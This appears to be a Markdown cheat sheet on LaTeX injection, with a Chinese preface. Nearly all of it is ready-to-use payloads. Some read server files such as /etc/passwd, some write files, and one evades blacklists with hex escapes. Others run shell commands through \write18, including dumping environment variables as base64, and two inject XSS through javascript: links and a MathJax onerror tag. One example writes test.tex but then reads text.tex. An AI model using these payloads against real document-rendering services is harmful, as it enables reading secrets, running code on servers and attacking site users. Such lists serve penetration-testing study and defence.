<!--
 * [业务问题]: LaTeX 注入发生在 Web 应用将用户输入直接嵌入到 LaTeX 编译过程中时。由于 LaTeX 强大的脚本能力，攻击者可以利用它读取服务器上的任意文件（可能是配置文件或源代码）、写入恶意文件甚至执行系统命令。
 * [实现逻辑]: 本文档详细介绍了 LaTeX 注入的多种攻击向量，包括使用 \input 和 \openin 读取文件、使用 \newwrite 写入文件、使用 \write18 执行系统命令以及利用 LaTeX 生成 XSS Payload。
 -->

# LaTeX Injection (LaTeX 注入)

> LaTeX 注入是一种注入攻击类型，其中恶意内容被注入到 LaTeX 文档中。LaTeX 广泛用于文档准备和排版，特别是在学术界，用于制作高质量的科学和数学文档。由于其强大的脚本功能，如果没有适当的安全措施，攻击者可以利用 LaTeX 来执行任意命令。

## 概要 (Summary)


## Summary

* [File Manipulation](#file-manipulation)
    * [Read File](#read-file)
    * [Write File](#write-file)
* [Command Execution](#command-execution)
* [Cross Site Scripting](#cross-site-scripting)
* [References](#references)


## File Manipulation

### Read File

Attackers can read the content of sensitive files on the server.

Read file and interpret the LaTeX code in it:

```tex
\input{/etc/passwd}
\include{somefile} # load .tex file (somefile.tex)
```

Read single lined file:

```tex
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```

Read multiple lined file:

```tex
\lstinputlisting{/etc/passwd}
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
    \read\file to\fileline
    \text{\fileline}
\repeat
\closein\file
```

Read text file, **without** interpreting the content, it will only paste raw file content:

```tex
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```

If injection point is past document header (`\usepackage` cannot be used), some control 
characters can be deactivated in order to use `\input` on file containing `$`, `#`, 
`_`, `&`, null bytes, ... (eg. perl scripts).

```tex
\catcode `\$=12
\catcode `\#=12
\catcode `\_=12
\catcode `\&=12
\input{path_to_script.pl}
```

To bypass a blacklist try to replace one character with it's unicode hex value. 
- ^^41 represents a capital A
- ^^7e represents a tilde (~) note that the ‘e’ must be lower case

```tex
\lstin^^70utlisting{/etc/passwd}
```

### Write File

Write single lined file:

```tex
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\write\outfile{Line 2}
\write\outfile{I like trains}
\closeout\outfile
```


## Command Execution

The output of the command will be redirected to stdout, therefore you need to use a temp file to get it.

```tex
\immediate\write18{id > output}
\input{output}
```

If you get any LaTex error, consider using base64 to get the result without bad characters (or use `\verbatiminput`):

```tex
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```

```tex
\input|ls|base64
\input{|"/bin/hostname"}
```


## Cross Site Scripting

From [@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130) 

```tex
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```

in [mathjax](https://docs.mathjax.org/en/latest/input/tex/extensions/unicode.html)

```tex
\unicode{<img src=1 onerror="<ARBITRARY_JS_CODE>">}
```


## Labs

* [Root Me - LaTeX - Input](https://www.root-me.org/en/Challenges/App-Script/LaTeX-Input)
* [Root Me - LaTeX - Command execution](https://www.root-me.org/en/Challenges/App-Script/LaTeX-Command-execution)


## References

- [Hacking with LaTeX - Sebastian Neef - March 10, 2016](https://0day.work/hacking-with-latex/)
- [Latex to RCE, Private Bug Bounty Program - Yasho - July 6, 2018](https://medium.com/bugbountywriteup/latex-to-rce-private-bug-bounty-program-6a0b5b33d26a)
- [Pwning coworkers thanks to LaTeX - scumjr - November 28, 2016](http://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)